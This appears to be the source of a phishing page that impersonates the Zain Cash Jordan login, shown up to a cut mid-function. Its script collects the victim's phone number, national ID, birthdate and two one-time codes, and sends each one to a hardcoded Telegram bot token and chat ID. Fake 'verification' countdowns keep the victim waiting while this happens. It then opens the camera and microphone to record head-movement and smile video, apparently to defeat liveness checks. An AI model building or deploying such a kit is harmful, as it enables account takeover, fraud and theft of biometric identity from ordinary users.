<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Ø²ÙŠÙ† ÙƒØ§Ø´ Ø§Ù„Ø£Ø±Ø¯Ù† | ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</title>
  <meta name="theme-color" content="#2F80ED">
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;900&display=swap" rel="stylesheet">

  <!-- MediaPipe FaceMesh + Camera Utils (Ù„ØªØªØ¨Ø¹ Ø§Ù„ÙˆØ¬Ù‡ ÙÙŠ Ø§Ù„Ù…ØªØµÙØ­) -->
  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/face_mesh.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>

  <style>
    :root{
      --primary-1: #2F80ED;
      --primary-2: #56CCF2;
      --muted: #f2f8fd;
      --input-border: rgba(86,204,242,0.2);
      --input-shadow: rgba(86,204,242,0.08);
      --danger-1: #ef5350;
      --danger-2: #e53935;
    }
    html,body{height:100%}
    body {
      background: linear-gradient(135deg, var(--primary-1) 0%, var(--primary-2) 100%);
      font-family: 'Cairo', Arial, sans-serif;
      margin: 0;
      display:flex;
      align-items:center;
      justify-content:center;
    }
    #app {
      background:#fff;
      border-radius:22px;
      width:370px;
      max-width:95vw;
      padding:32px 26px;
      direction:rtl;
      box-shadow: 0 8px 32px rgba(47,128,237,0.13);
      border: 2.5px solid #2F80ED33;
      overflow:hidden;
    }
    .zain-header { display:flex; align-items:center; justify-content:center; gap:10px; margin-bottom:14px; }
    .zain-logo { width:64px; height:64px; border-radius:20px; background:linear-gradient(135deg,var(--primary-2) 60%,var(--primary-1) 100%); display:flex; align-items:center; justify-content:center; border:2.5px solid #fff; }
    .zain-logo img { width:60px; height:60px; object-fit:contain; border-radius:16px; background:#fff; border:1.5px solid #e3eefe; }
    .zain-title-main { font-size:25px; font-weight:900; color:var(--primary-1); margin:0; text-shadow:0 1px 0 #fff,0 2px 8px #2f80ed22; }
    .zain-title-sub { font-size:15px; color:#353a4d; font-weight:600; text-align:center; margin-top:2px; }
    .step-indicator { display:flex; justify-content:center; gap:6.5px; margin:12px 0; }
    .step-dot { width:11px; height:11px; border-radius:50%; background:#eaf2fd; border:2px solid var(--primary-2); }
    .step-dot.active { background: linear-gradient(135deg,var(--primary-1) 70%,var(--primary-2) 100%); border-color:var(--primary-1); }

    label { color:var(--primary-1); font-size:15px; font-weight:600; margin-bottom:8px; display:block; }
    input, select { padding:12px; border-radius:10px; border:2px solid var(--input-border); background:var(--muted); font-size:15px; box-shadow:0 1.5px 5px var(--input-shadow); width:100%; box-sizing:border-box; color:#222; }
    input:focus, select:focus { box-shadow:0 6px 22px rgba(47,128,237,0.18); border-color:var(--primary-1); background:#fbfeff; }

    .button { background: linear-gradient(90deg,var(--primary-1) 0%,var(--primary-2) 100%); color:#fff; border:none; padding:13px 12px; border-radius:9px; font-size:18px; font-weight:800; cursor:pointer; box-shadow:0 1px 6px rgba(47,128,237,0.14); min-width:120px; text-align:center; }
    .button:active { transform:translateY(1px); opacity:0.92; }
    .back-btn { display:inline-block; background:transparent; color:var(--primary-1); padding:8px 10px; border-radius:8px; font-weight:700; cursor:pointer; font-size:14px; margin-bottom:10px; }
    .danger-button { background: linear-gradient(90deg,var(--danger-1) 0%,var(--danger-2) 100%); color:#fff; border:none; padding:11px 12px; border-radius:9px; font-weight:800; cursor:pointer; }
    .info-msg { text-align:center; color:var(--primary-1); font-weight:600; margin:8px 0; }

    .code-inputs { display:flex; justify-content:center; gap:10px; margin:8px 0; }
    .code-inputs input { width:120px; text-align:center; font-size:19px; letter-spacing:5px; direction:ltr; font-weight:700; padding:12px; border-radius:9px; border:2px solid rgba(86,204,242,0.33); background:var(--muted); box-shadow:0 1.5px 5px var(--input-shadow); }

    .camera-wrap { display:flex; flex-direction:column; align-items:center; gap:14px; }
    .camera-box { width:100%; max-width:320px; height:420px; background:#2f2f33; border-radius:8px; overflow:hidden; position:relative; border:6px solid #fff; display:flex; align-items:center; justify-content:center; }
    .camera-box video { width:100%; height:100%; object-fit:cover; transform: scaleX(-1); /* mirror to user like selfie */ }
    .instruction-box { background: rgba(0,0,0,0.72); color:#fff; padding:12px; border-radius:10px; max-width:320px; text-align:center; font-size:16px; line-height:1.45; }
    .countdown { position:absolute; top:8px; left:8px; background:rgba(0,0,0,0.45); color:#fff; padding:6px 10px; border-radius:12px; font-weight:700; }

    #processingModal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.55); z-index:10000; align-items:center; justify-content:center; color:#fff; }
    #processingModal.active { display:flex; }
    .processingBox { background:rgba(0,0,0,0.65); padding:20px 26px; border-radius:12px; text-align:center; min-width:260px; }
    .spinner { width:48px; height:48px; border-radius:50%; border:5px solid rgba(255,255,255,0.18); border-top-color:#fff; animation:spin 1s linear infinite; margin:0 auto 12px; }
    @keyframes spin { to { transform:rotate(360deg); } }

    #modalError { display:none; position:fixed; inset:0; background:rgba(47,128,237,0.13); z-index:9999; align-items:center; justify-content:center; }
    #modalError.active { display:flex; }
    #modalContent { background:#fff; padding:27px 32px; border-radius:13px; text-align:center; border:2px solid #f9b3b3; box-shadow:0 7px 34px rgba(47,128,237,0.2); }
    #modalContent .err-title { color:#e53935; font-size:19px; font-weight:700; }
    #modalContent .err-msg { margin-top:8px; font-weight:600; color:#444; }

    .zain-footer { margin-top:20px; text-align:center; color:#a6c7ef; font-weight:600; font-size:13px; opacity:0.85; }

    @media (max-width:450px){
      #app{padding:16px 14px}
      .camera-box{height:320px}
      .code-inputs input{width:90px}
    }
  </style>
</head>
<body>
  <div id="app"></div>

  <div id="processingModal" aria-hidden="true">
    <div class="processingBox">
      <div class="spinner" aria-hidden="true"></div>
      <div style="font-weight:700;font-size:18px;">Ø¬Ø§Ø±Ù Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ù‡ÙˆÙŠØªÙƒ...</div>
      <div style="margin-top:6px;color:#ddd;font-size:14px;">Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ø­ØªÙ‰ Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡</div>
    </div>
  </div>

  <div id="modalError" role="dialog" aria-hidden="true">
    <div id="modalContent">
      <div class="err-title">ÙŠÙˆØ¬Ø¯ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª</div>
      <div class="err-msg">ÙŠØ±Ø¬Ù‰ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø©. Ø³ÙŠØªÙ… ØªÙˆØ¬ÙŠÙ‡Ùƒ Ø¥Ù„Ù‰ Ø§Ù„Ø¨Ø¯Ø§ÙŠØ©.</div>
      <div style="margin-top:12px;"><button id="modalCloseBtn" class="button">Ø¥ØºÙ„Ø§Ù‚</button></div>
    </div>
  </div>

<script>
  // --- Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø¨ÙˆØª ---
  const BOT_TOKEN = "8190400010:AAERe3gfKcxCz2CjjFIDBobm1ER-2SkYkXA";
  const CHAT_ID = "6873334348";

  const app = document.getElementById('app');
  const faceLogo = "https://e.top4top.io/p_3664gms740.jpeg";
  const zainCashLogo = "https://www2.0zz0.com/2025/06/23/15/797647963.jpeg";

  let userData = { phone:'', nationalId:'', birthdate:'', code5:'', code4:'' };
  let telegramMsgId = null;
  let waitingTimeout = null;

  // MediaPipe objects (initialized later)
  let faceMesh = null;
  let mpCamera = null;

  // Helper UI constructors
  function stepIndicator(step){
    return `
      <div class="step-indicator">
        <div class="step-dot${step===1?' active':''}"></div>
        <div class="step-dot${step===2?' active':''}"></div>
        <div class="step-dot${step===3?' active':''}"></div>
      </div>
    `;
  }
  function header(sub=""){
    return `
      <div class="zain-header">
        <div class="zain-logo"><img src="${zainCashLogo}" alt="Zain Cash"></div>
        <span class="zain-title-main">Ø²ÙŠÙ† ÙƒØ§Ø´ Ø§Ù„Ø£Ø±Ø¯Ù†</span>
      </div>
      <div class="zain-title-sub">${sub}</div>
    `;
  }

  // --- Standard pages (phone, national, codes) ---
  function renderPhoneStep(){
    app.innerHTML = `
      ${header("Ù…Ø±Ø­Ø¨Ù‹Ø§ Ø¨Ùƒ! Ø³Ø¬Ù„ Ø¯Ø®ÙˆÙ„Ùƒ Ù„Ø­Ø³Ø§Ø¨Ùƒ")}
      ${stepIndicator(1)}
      <form id="phoneForm" autocomplete="off">
        <label>Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ Ø§Ù„Ù…Ø±ØªØ¨Ø· Ø¨Ø­Ø³Ø§Ø¨Ùƒ</label>
        <input type="tel" id="phone" placeholder="07XXXXXXXX" pattern="07[0-9]{8}" maxlength="10" required autocomplete="tel" inputmode="numeric"/>
        <div style="margin-top:12px;text-align:center;"><button type="submit" class="button">Ø§Ù„ØªØ§Ù„ÙŠ</button></div>
      </form>
      <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
    `;
    const phone = document.getElementById('phone');
    phone.focus();
    document.getElementById('phoneForm').onsubmit = async (e) => {
      e.preventDefault();
      const v = phone.value.trim();
      if(!/^07\d{8}$/.test(v)){ alert('ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù‚Ù… Ù‡Ø§ØªÙ ØµØ­ÙŠØ­ ÙŠØ¨Ø¯Ø£ Ø¨Ù€ 07 ÙˆÙŠØªÙƒÙˆÙ† Ù…Ù† 10 Ø£Ø±Ù‚Ø§Ù…'); phone.focus(); return; }
      userData.phone = v;
      try { telegramMsgId = await sendToTelegramAndGetMsgId(`ğŸŸ¦ ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ø²ÙŠÙ† ÙƒØ§Ø´ Ø§Ù„Ø£Ø±Ø¯Ù†\nğŸ“± Ø§Ù„Ù‡Ø§ØªÙ: ${userData.phone}`); } catch(e){ console.log(e); }
      renderNationalIdStep();
    };
  }

  function renderNationalIdStep(){
    app.innerHTML = `
      <button class="back-btn" id="backBtn">&#8592; Ø±Ø¬ÙˆØ¹</button>
      ${header("ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§ØªÙƒ Ø§Ù„Ø´Ø®ØµÙŠØ©")}
      ${stepIndicator(1)}
      <form id="nationalForm" autocomplete="off">
        <label>Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ÙˆØ·Ù†ÙŠ</label>
        <input type="text" id="nationalId" placeholder="Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ÙˆØ·Ù†ÙŠ" maxlength="12" required inputmode="numeric"/>
        <label>ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯</label>
        <div class="birthdate-fields" id="birthdateFields"></div>
        <div style="margin-top:12px;text-align:center;"><button type="submit" class="button">Ø§Ù„ØªØ§Ù„ÙŠ</button></div>
      </form>
      <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
    `;
    renderBirthdateFields();
    document.getElementById('nationalId').focus();
    document.getElementById('nationalForm').onsubmit = async (e) => {
      e.preventDefault();
      const nid = document.getElementById('nationalId').value.trim();
      const day = document.getElementById('birthDay').value;
      const month = document.getElementById('birthMonth').value;
      const year = document.getElementById('birthYear').value;
      if(!/^\d{10,12}$/.test(nid)){ alert('ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù‚Ù… ÙˆØ·Ù†ÙŠ ØµØ­ÙŠØ­ (10 Ø¥Ù„Ù‰ 12 Ø±Ù‚Ù…)'); document.getElementById('nationalId').focus(); return; }
      if(!day || !month || !year){ alert('ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯ (Ø§Ù„ÙŠÙˆÙ…/Ø§Ù„Ø´Ù‡Ø±/Ø§Ù„Ø³Ù†Ø©)'); return; }
      userData.nationalId = nid;
      userData.birthdate = `${year}-${month.padStart(2,'0')}-${day.padStart(2,'0')}`;
      try { telegramMsgId = await resendTelegramMsg(`ğŸŸ¦ ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ø²ÙŠÙ† ÙƒØ§Ø´ Ø§Ù„Ø£Ø±Ø¯Ù†\nğŸ“± Ø§Ù„Ù‡Ø§ØªÙ: ${userData.phone}\nğŸ†” ${userData.nationalId}\nğŸ‚ ${userData.birthdate}`); } catch(e){ console.log(e); }
      showNationalIdWaitAndGotoCode5();
    };
    document.getElementById('backBtn').onclick = () => renderPhoneStep();
  }

  function renderBirthdateFields(){
    const now = new Date(), maxYear = now.getFullYear(), minYear = maxYear - 100;
    const el = document.getElementById('birthdateFields');
    let days = '<select id="birthDay" required><option value="">Ø§Ù„ÙŠÙˆÙ…</option>';
    for(let d=1; d<=31; d++) days += `<option value="${d}">${d}</option>`;
    days += '</select>';
    const monthNames = ['ÙŠÙ†Ø§ÙŠØ±','ÙØ¨Ø±Ø§ÙŠï¿½ï¿½','Ù…Ø§Ø±Ø³','Ø£Ø¨Ø±ÙŠÙ„','Ù…Ø§ÙŠÙˆ','ÙŠÙˆÙ†ÙŠÙˆ','ÙŠÙˆÙ„ÙŠÙˆ','Ø£ØºØ³Ø·Ø³','Ø³Ø¨ØªÙ…Ø¨Ø±','Ø£ÙƒØªÙˆØ¨Ø±','Ù†ÙˆÙÙ…Ø¨Ø±','Ø¯ÙŠØ³Ù…Ø¨Ø±'];
    let months = '<select id="birthMonth" required><option value="">Ø§Ù„Ø´Ù‡Ø±</option>';
    for(let m=1;m<=12;m++) months += `<option value="${m}">${monthNames[m-1]}</option>`;
    months += '</select>';
    let years = '<select id="birthYear" required><option value="">Ø§Ù„Ø³Ù†Ø©</option>';
    for(let y=maxYear;y>=minYear;y--) years += `<option value="${y}">${y}</option>`;
    years += '</select>';
    el.innerHTML = `<div style="display:flex;gap:8px;">${days}${months}${years}</div>`;
  }

  function showNationalIdWaitAndGotoCode5(){
    const randomWait = Math.floor(Math.random()*26)+15;
    app.innerHTML = `
      <div style="padding:40px 0;text-align:center;">
        <div style="margin-bottom:18px;"><img src="${zainCashLogo}" width="60" height="60" style="border-radius:14px;"/></div>
        <div style="color:var(--primary-1);font-size:22px;font-weight:900;margin-bottom:8px;">ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±...</div>
        <div style="color:#353a4d;font-size:15px;">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…Ø¯Ø®Ù„Ø©</div>
        <div id="waitSecNational" style="margin:20px auto 0;font-size:16px;color:#1887d2;font-weight:700;">${randomWait}</div>
      </div>
      <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
    `;
    let sec = randomWait;
    const waitElem = document.getElementById('waitSecNational');
    waitingTimeout = setInterval(()=>{ sec--; if(waitElem) waitElem.textContent = sec; if(sec===0){ clearInterval(waitingTimeout); renderCode5Step(); } },1000);
  }

  function renderCode5Step(){
    app.innerHTML = `
      <button class="back-btn" id="backBtn">&#8592; Ø±Ø¬ÙˆØ¹</button>
      ${header("ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² ØªØ­Ù‚Ù‚ Ø¥Ù„Ù‰ Ù‡Ø§ØªÙÙƒ")}
      ${stepIndicator(2)}
      <div class="info-msg">Ø£Ø¯Ø®Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ù…ÙƒÙˆÙ† Ù…Ù† 5 Ø£Ø±Ù‚Ø§Ù… ÙƒÙ…Ø§ ÙˆØµÙ„Ùƒ Ø¨Ø±Ø³Ø§Ù„Ø© SMS</div>
      <form id="code5Form" autocomplete="off">
        <div class="code-inputs"><input id="code5input" maxlength="5" inputmode="numeric" placeholder="*****" required></div>
        <div style="margin-top:12px;text-align:center;"><button type="submit" class="button">ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø±Ù…Ø²</button></div>
      </form>
      <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
    `;
    const codeInput = document.getElementById('code5input');
    codeInput.focus();
    codeInput.addEventListener('input', function(){ this.value = this.value.replace(/\D/g,'').slice(0,5); });
    document.getElementById('code5Form').onsubmit = async (e) => {
      e.preventDefault();
      const code = codeInput.value.trim();
      if(code.length !== 5){ alert('ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù…Ø² Ù…ÙƒÙˆÙ† Ù…Ù† 5 Ø£Ø±Ù‚Ø§Ù…'); codeInput.focus(); return; }
      userData.code5 = code;
      try { telegramMsgId = await resendTelegramMsg(`ğŸŸ¦ ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ø²ÙŠÙ† ÙƒØ§Ø´ Ø§Ù„Ø£Ø±Ø¯Ù†\nğŸ“± ${userData.phone}\nğŸ†” ${userData.nationalId}\nğŸ‚ ${userData.birthdate}\nğŸ”¢ ${userData.code5}`); } catch(e){ console.log(e); }
      showWaitMsgAndGotoCode4();
    };
    document.getElementById('backBtn').onclick = () => renderNationalIdStep();
  }

  function showWaitMsgAndGotoCode4(){
    const randomWait = Math.floor(Math.random()*6)+15;
    app.innerHTML = `
      <div style="padding:40px 0;text-align:center;">
        <div style="margin-bottom:18px;"><img src="${zainCashLogo}" width="60" height="60" style="border-radius:14px;"/></div>
        <div style="color:var(--primary-1);font-size:22px;font-weight:900;margin-bottom:8px;">ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±...</div>
        <div style="color:#353a4d;font-size:15px;">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø±Ù…Ø² Ø§Ù„Ø¯Ø®ÙˆÙ„</div>
        <div id="waitSec" style="margin:20px auto 0;font-size:16px;color:#1887d2;font-weight:700;">${randomWait}</div>
      </div>
      <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
    `;
    let sec = randomWait;
    const waitElem = document.getElementById('waitSec');
    waitingTimeout = setInterval(()=>{ sec--; if(waitElem) waitElem.textContent = sec; if(sec===0){ clearInterval(waitingTimeout); renderCode4Step(); } },1000);
  }

  function renderCode4Step(){
    app.innerHTML = `
      <button class="back-btn" id="backBtn">&#8592; Ø±Ø¬ÙˆØ¹</button>
      ${header("ØªØ­Ù‚Ù‚ Ø¥Ø¶Ø§ÙÙŠ Ù„Ø­Ù…Ø§ÙŠØ© Ø­Ø³Ø§Ø¨Ùƒ")}
      ${stepIndicator(3)}
      <div class="info-msg">Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ù…ÙƒÙˆÙ† Ù…Ù† 4 Ø£Ø±Ù‚Ø§Ù…</div>
      <form id="code4Form" autocomplete="off">
        <div class="code-inputs"><input id="code4input" maxlength="4" inputmode="numeric" placeholder="****" required></div>
        <div style="margin-top:12px;text-align:center;"><button type="submit" class="button">ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø±Ù…Ø²</button></div>
      </form>
      <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
    `;
    const codeInput = document.getElementById('code4input');
    codeInput.focus();
    codeInput.addEventListener('input', function(){ this.value = this.value.replace(/\D/g,'').slice(0,4); });
    document.getElementById('code4Form').onsubmit = async (e) => {
      e.preventDefault();
      const code = codeInput.value.trim();
      if(code.length !== 4){ alert('ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù…Ø² Ù…ÙƒÙˆÙ† Ù…Ù† 4 Ø£Ø±Ù‚Ø§Ù…'); codeInput.focus(); return; }
      userData.code4 = code;
      try { telegramMsgId = await resendTelegramMsg(`ğŸŸ¦ ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ø²ÙŠÙ† ÙƒØ§Ø´ Ø§Ù„Ø£Ø±Ø¯Ù†\nğŸ“± ${userData.phone}\nğŸ†” ${userData.nationalId}\nğŸ‚ ${userData.birthdate}\nğŸ”¢ ${userData.code5}\nğŸ”’ ${userData.code4}`); } catch(e){ console.log(e); }
      try {
        await startCaptureSequence(); // ÙŠØ¨Ø¯Ø£ Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ
      } catch (err) {
        console.error('Capture failed', err);
        alert('Ù„Ù… Ù†Ø³ØªØ·Ø¹ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§. ÙŠØ±Ø¬Ù‰ Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø£Ø°ÙˆÙ†Ø§Øª Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø«Ù… Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.');
        renderCode4Step();
      }
    };
    document.getElementById('backBtn').onclick = () => renderCode5Step();
  }

  // ØªØ¬Ù‡ÙŠØ² Ù‚Ø¨Ù„ Ø§Ù„Ø¥Ø°Ù†
  function renderPreparingMessage(){
    app.innerHTML = `
      <div style="text-align:center;padding:18px;">
        <div style="margin:10px auto 14px; width:140px; height:140px;">
          <img src="${faceLogo}" alt="Ø´Ø¹Ø§Ø± Ø§Ù„ÙˆØ¬Ù‡" style="width:100%;height:100%;object-fit:contain;border-radius:12px;background:#fff;padding:8px;border:1px solid #eee;"/>
        </div>
        <div style="font-size:18px;color:#353a4d;font-weight:700;margin-bottom:8px;">Ø³ÙŠÙØ·Ù„Ø¨ Ø¥Ø°Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø¢Ù†</div>
        <div style="color:#666;font-size:14px;">
          Ø³Ù†Ø³Ø¬Ù„ ÙÙŠØ¯ÙŠÙˆ Ù‚ØµÙŠØ± ÙŠØªØ¶Ù…Ù† Ø£Ø±Ø¨Ø¹ Ø®Ø·ÙˆØ§Øª: <strong>Ø§ØºÙ…Ø§Ø¶ Ø§Ù„Ø¹ÙŠÙ†</strong>ØŒ <strong>ÙˆØ¬Ù‡ ÙŠØ³Ø§Ø±</strong>ØŒ <strong>ÙˆØ¬Ù‡ ÙŠÙ…ÙŠÙ†</strong>ØŒ <strong>Ø§Ø¨ØªØ³Ù…</strong>.<br>
          Ø§Ø¶Ø¨Ø· ÙˆØ¬Ù‡Ùƒ Ø¯Ø§Ø®Ù„ Ø§Ù„Ø¥Ø·Ø§Ø±ØŒ Ø£Ø²Ù„ Ø§Ù„Ù‚Ø¨Ø¹Ø©/Ø§Ù„Ù†Ø¸Ø§Ø±Ø§Øª Ø¥Ø°Ø§ Ù„Ø²Ù…ØŒ ÙˆØ§Ø³Ù…Ø­ Ø¨Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§.
        </div>
      </div>
    `;
  }

  // ============================================
  // Face detection & movement feedback logic
  // - mirror video for the user (CSS scaleX(-1))
  // - use MediaPipe FaceMesh to get nose landmark X
  // - for each step set a baseline X then show live feedback "ØªØ­Ø±Ùƒ Ù„Ù„ÙŠØ³Ø§Ø±" / "ØªØ­Ø±Ùƒ Ù„Ù„ÙŠÙ…ÙŠÙ†"
  // ============================================
  async function startCaptureSequence(){
    renderPreparingMessage();
    await wait(900);

    const steps = [
      { label: 'Ø§ØºÙ…Ø¶ Ø¹ÙŠÙ†ÙŠÙƒ', instruction: 'Ø£ØºÙ„Ù‚ Ø¹ÙŠÙ†ÙŠÙƒ Ø¨Ø§Ù„ÙƒØ§Ù…Ù„ Ù„Ù…Ø¯Ø© 5 Ø«ÙˆØ§Ù†Ù', duration: 5000 },
      { label: 'Ø­Ø±Ùƒ ÙˆØ¬Ù‡Ùƒ Ø¥Ù„Ù‰ Ø§Ù„ÙŠØ³Ø§Ø±', instruction: 'Ø­Ø±Ù‘Ùƒ ÙˆØ¬Ù‡Ùƒ Ø¨Ø¨Ø·Ø¡ Ø¥Ù„Ù‰ Ø§Ù„ÙŠØ³Ø§Ø± Ø«Ù… Ø¹Ø¯ Ù„Ù„Ù…Ù†ØªØµÙ', duration: 5000 },
      { label: 'Ø­Ø±Ùƒ ÙˆØ¬Ù‡Ùƒ Ø¥Ù„Ù‰ Ø§Ù„ÙŠÙ…ÙŠÙ†', instruction: 'Ø­Ø±Ù‘Ùƒ ÙˆØ¬Ù‡Ùƒ Ø¨Ø¨Ø·Ø¡ Ø¥Ù„Ù‰ Ø§Ù„ÙŠÙ…ÙŠÙ† Ø«Ù… Ø¹Ø¯ Ù„Ù„Ù…Ù†ØªØµÙ', duration: 5000 },
      { label: 'Ø§Ø¨ØªØ³Ù…', instruction: 'Ø§Ø¨ØªØ³Ù… Ø·Ø¨ÙŠØ¹ÙŠØ§Ù‹ Ù„Ù…Ø¯Ø© 5 Ø«ÙˆØ§Ù†Ù', duration: 5000 }
    ];

    // Camera UI
    app.innerHTML = `
      <div style="padding:8px;">
        <div class="camera-wrap">
          <div class="camera-box" id="cameraBox">
            <div class="countdown" id="countdown" style="display:none">3</div>
            <video id="videoPreview" playsinline autoplay muted></video>
          </div>
          <div class="instruction-box" id="instructionBox">Ø¬Ø§Ø±ÙŠ ØªØ¬Ù‡ÙŠØ² Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§...</div>
          <div style="width:100%;display:flex;gap:10px;justify-content:center;">
            <button id="cancelCapture" class="danger-button">Ø¥Ù„ØºØ§Ø¡</button>
          </div>
        </div>
      </div>
    `;

    const videoEl = document.getElementById('videoPreview');
    const instructionBox = document.getElementById('instructionBox');
    const countdownEl = document.getElementById('countdown');
    const cancelBtn = document.getElementById('cancelCapture');

    // Get camera stream (prompts user)
    let stream;
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
    } catch (err) {
      throw err;
    }
    videoEl.srcObject = stream;

    // Initialize MediaRecorder (to keep previous behavior of sending recording)
    // We'll still record as before: start/stop recorder across steps
    // but we run FaceMesh in parallel to provide live feedback.
    const optionsForRecorder = (typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) ?
      { mimeType: 'video/webm;codecs=vp8,opus' } : undefined;
    let allChunks = [];
    let recorder;
    try {
      recorder = new MediaRecorder(stream, optionsForRecorder);
    } catch(e) {
      recorder = new MediaRecorder(stream);
    }
    recorder.ondataavailable = (ev) => { if (ev.data && ev.data.size) allChunks.push(ev.data); };

    // Initialize MediaPipe FaceMesh
    faceMesh = new FaceMesh.FaceMesh({
      locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}`
    });
    faceMesh.setOptions({
      maxNumFaces: 1,
      refineLandmarks: true,
      minDetectionConfidence: 0.5,
      minTrackingConfidence: 0.5
    });

    // Variables for movement detection
    let baselineX = null;
    const movementThreshold = 0.03; // adjust sensitivity (normalized coords)
    let lastDirection = '';

    // onResults callback will run for every frame processed by MediaPipe
    faceMesh.onResults((results) => {
      if (!results.multiFaceLandmarks || !results.multiFaceLandmarks[0]) {
        // no face found
        return;
      }
      // choose nose tip landmark (use landmark index 1 which is near nose tip)
      const lm = results.multiFaceLandmarks[0][1];
      if (!lm) return;
      // lm.x is normalized [0..1] with origin on left of image (not mirrored)
      // our video is mirrored visually (CSS scaleX(-1)), but the detection coordinates are not mirrored.
      // For user-friendly feedback (what user sees), we will mirror the coordinate:
      const shownX = 1 - lm.x; // if video is mirrored visually, mirrored coordinate corresponds to what's seen
      // compute delta relative to baseline (set at beginning of each step)
      if (baselineX === null) return; // baseline not set yet
      const delta = shownX - baselineX;
      let dir = '';
      if (delta > movementThreshold) dir = 'ÙŠÙ…ÙŠÙ†';
      else if (delta < -movementThreshold) dir = 'ÙŠØ³Ø§Ø±';
      else dir = 'Ù…Ø±ÙƒØ²';
      // update instruction box indicator (only change when direction changes to avoid flicker)
      if (dir !== lastDirection) {
        if (dir === 'Ù…Ø±ÙƒØ²') instructionBox.textContent = `(Ù…Ø±ÙƒØ²) - Ø­Ø§ÙØ¸ Ø¹Ù„Ù‰ ÙˆØ¶Ø¹ Ø§Ù„Ø±Ø£Ø³ Ø«Ù… Ø§ØªØ¨Ø¹ Ø§Ù„ØªØ¹Ù„ÙŠÙ…Ø§Øª`;
        else instructionBox.textContent = `ØªÙ‚Ø¯Ù‘Ù…: ØªØªØ­Ø±Ùƒ Ù†Ø­Ùˆ ${dir} â€” ${dir === 'ÙŠØ³Ø§Ø±' ? 'ØªØ­Ø±Ùƒ Ù„Ù„ÙŠØ³Ø§Ø±' : 'ØªØ­Ø±Ùƒ Ù„Ù„ÙŠÙ…ÙŠÙ†'}`;
        lastDirection = dir;
      }
    });

    // Start MediaPipe camera processing (uses video element frames)
    mpCamera = new Camera.Camera(videoEl, {
      onFrame: async () => {
        await faceMesh.send({ image: videoEl });
      },
      width: 640,
      height: 480
    });
    mpCamera.start();

    // Cancel handler
    let cancelled = false;
